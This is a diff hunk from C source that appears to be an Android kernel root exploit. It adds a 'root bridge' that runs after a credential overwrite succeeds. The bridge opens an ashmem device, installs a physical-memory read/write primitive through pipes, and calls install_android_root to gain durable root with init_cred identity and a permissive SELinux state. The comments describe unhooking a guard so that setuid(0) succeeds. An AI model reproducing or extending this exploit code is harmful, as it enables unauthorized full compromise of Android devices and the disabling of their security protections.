@@ -2020,10 +2020,34 @@ void do_pselect_fake_lock_route(void) {
                               : (cred_mode ? (cq == 0 || uid0_payload_fired())
                                            : bootid_changed());
           if (cred_mode && cq == 0) {
-            /* cred LANDED: send G so the child execs the payload NOW */
+            /* cred LANDED: G execs the payload NOW. Then the full bridge:
+             * install pipe physrw on a fresh ashmem fd and run
+             * install_android_root (durable root: init_cred identity +
+             * permissive via the pipe writes). The child setuid(0) works
+             * because the guard is unhooked. */
             char g = 'G';
             if (g_uid0_cmd_w >= 0)
               (void)write(g_uid0_cmd_w, &g, 1);
+            {
+              int rfd = open_ashmem_device(); /* resolves the shell-openable alias via ashmem_path */
+              if (rfd >= 0) {
+                pr_info("ROOT BRIDGE: physrw install on fd=%d\n", rfd);
+                if (install_pipe_physrw(rfd)) {
+                  pr_info("ROOT BRIDGE: physrw ok -> install_android_root\n");
+                  int rooted = install_android_root(rfd);
+                  pr_info("ROOT BRIDGE: install_android_root=%d\n", rooted);
+                  live_sync_log("UID0", rooted ? "bridge_root_OK"
+                                               : "bridge_root_FAIL");
+                } else {
+                  pr_info("ROOT BRIDGE: physrw install failed\n");
+                  live_sync_log("UID0", "bridge_physrw_fail");
+                }
+                close(rfd);
+              } else {
+                pr_info("ROOT BRIDGE: no ashmem fd\n");
+                live_sync_log("UID0", "bridge_nofd");
+              }
+            }
           }
           if (landed)
             uid0_log_landing_signals("landing signals");
